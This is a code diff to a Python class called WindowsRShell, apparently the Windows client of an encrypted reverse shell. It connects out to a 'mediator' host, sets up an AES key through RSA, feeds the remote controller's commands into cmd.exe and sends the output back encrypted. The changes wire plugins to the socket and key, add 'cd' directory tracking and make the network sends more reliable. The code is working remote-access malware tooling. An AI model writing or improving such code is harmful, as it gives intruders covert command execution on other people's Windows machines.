@@ -10,6 +10,8 @@ from Crypto.Cipher import PKCS1_OAEP
 from Crypto.PublicKey import RSA
 from Crypto.Random import get_random_bytes
 import inspect
+import os
+import pathlib
 import plugins
 import socket
 import subprocess
@@ -41,7 +43,7 @@ class WindowsRShell:
             return False
         command = argv[0]
         try:
-            self.plugins[command](argv)
+            self.plugins[command](argv, self.handler, self.cipherKey)
             return True
         except KeyError:
             # command not in plugins
@@ -58,13 +60,26 @@ class WindowsRShell:
                 # check if command is a plugin -- if so run plugin's windows target code
                 plugin = self.tryPlugin(command.decode())
                 if plugin:
-                    # print new prompt
+                    # print new prompt after plugin is run
                     cmdexe.stdin.write(b'\n')
                     cmdexe.stdin.flush()
                 else:
                     # not a plugin -- send command to shell
                     cmdexe.stdin.write(command)
                     cmdexe.stdin.flush()
+                    # change working directory if cd command
+                    if "cd " in command.decode() or "cd\n" in command.decode():
+                        command = command.decode().strip()
+                        if len(command) == 2:
+                            p = pathlib.Path("~")
+                        else:
+                            p = pathlib.Path(command[3:])
+                        try:
+                            os.chdir(p.resolve())
+                        except Exception as e:
+                            # not a directory -- let shell output error message
+                            raise e
+                            pass
 
     def sendResponses(self, cmdexe):
         while True:
@@ -72,9 +87,9 @@ class WindowsRShell:
             cipher = AES.new(self.cipherKey, AES.MODE_EAX)
             nonce = cipher.nonce
             ciphertext, tag = cipher.encrypt_and_digest(ch)
-            self.handler.send(nonce)
-            self.handler.send(tag)
-            self.handler.send(ciphertext)
+            self.handler.sendall(nonce)
+            self.handler.sendall(tag)
+            self.handler.sendall(ciphertext)
 
     def keyExchange(self):
         try:
@@ -87,7 +102,7 @@ class WindowsRShell:
         key = get_random_bytes(32)
         cipher = PKCS1_OAEP.new(pubKey)
         message = cipher.encrypt(key)
-        self.handler.send(message)
+        self.handler.sendall(message)
         return key
 
     def connect(self, mediatorHost):
